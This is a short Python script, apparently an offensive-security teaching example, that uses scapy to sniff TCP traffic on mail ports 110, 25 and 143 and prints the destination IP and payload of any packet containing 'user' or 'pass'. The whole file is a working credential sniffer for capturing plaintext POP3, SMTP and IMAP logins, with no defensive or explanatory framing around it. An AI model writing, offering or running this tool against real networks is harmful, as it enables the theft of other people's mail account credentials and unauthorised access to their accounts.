from scapy.all import sniff, TCP, IP

# The packet callback function
def packet_callback(packet):
    # Check if the packet has a TCP payload
    if packet.haslayer(TCP) and packet[TCP].payload:
        # Convert the payload to a string
        mypacket = str(packet[TCP].payload)
        # Check for the presence of 'user' or 'pass' in the payload
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            # Print the destination IP and the payload
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # Start sniffing for packets
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)

if __name__ == '__main__':
    main()